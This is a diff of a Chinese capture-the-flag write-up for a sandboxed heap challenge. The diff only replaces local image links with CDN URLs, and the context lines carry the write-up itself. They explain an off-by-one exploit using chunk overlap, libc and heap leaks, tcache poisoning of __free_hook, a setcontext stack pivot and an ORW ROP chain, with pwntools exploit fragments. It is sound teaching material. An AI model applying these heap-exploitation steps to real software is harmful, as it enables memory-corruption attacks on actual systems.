@@ -2,15 +2,15 @@
 ### 程序分析
 此题保护全开，还开了沙箱保护，只能通过ROW getflag  
 有show函数可以得到堆中内容，有问题的地方是edit函数，存在off by one漏洞。  
-![](./pics/add.png)  
-![](./pics/edit.png)  
-![](./pics/ineidt.png)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/add.png)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/edit.png)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/ineidt.png)  
 由于多读了一字节，可以覆盖下一个chunk的preinuse位。  
 需要注意的是edit中会对输入做一定处理，根据每个字符是否是1进行判断，因此我的输入为01组成的字符串，该字符串会按每8个字符进行分割，逆序后组成一个字节。  
 ### 思路分析
 决定使用unsortedbin unlink泄露libc地址、堆地址，得到free_hook地址，在free_hook处写下setcontext+53地址,，这样能在调用free时更改寄存器（rbp，rip）的值，用栈迁移劫持程序运行堆上布置好的orw rop链。  
 这是我第一次使用setcontext相关内容，我们可以用gdb查看下里面的东西。  
-![](./pics/setcontext.png)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/setcontext.png)  
 发现在setcontext+53的地方有大量寄存器赋值的操作，使用pwntools的SigreturnFrame自动生成frame。  
 
 接下来的大致思路都写在注释里了。  
@@ -28,7 +28,7 @@ for i in range(8):
     free(i)
 overedit(8, b'1' * 0x80 + p64(0x120) , 0)#改变第9块的presize和preinuse，使其释放时把第8第7块一块合并了，实现堆块重叠，这样只要第8块中出现libc地址就能用show函数得到
 ```
-![](./pics/pic1.png)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/pic1.png)  
 ```
 free(9)
 add(11, 0x98)
@@ -50,7 +50,7 @@ heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
 print("heap_addr: ",hex(heap_addr))
 edit(8,p64(0)+p64(91)+p64(free_hook))#改变tcache中第一个free chunk的fd指针为free_hook
 ```
-![](./pics/pic2.png)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/pic2.png)  
 接下来只需要申请两次大小为0x90的chunk就能在free_hook上开辟chunk。  
 ```
 add(1, 0x88)
@@ -81,5 +81,5 @@ edit(14,orw_payload)
 edit(15,byte_frame)
 free(15)#自动完成setcontext，然后执行orwrop链
 ```
-![](./pics/success.jpg)  
+![](https://s-bj-4514-pwnpic.oss.dogecdn.com/sandboxheap/pics/success.jpg)  
 
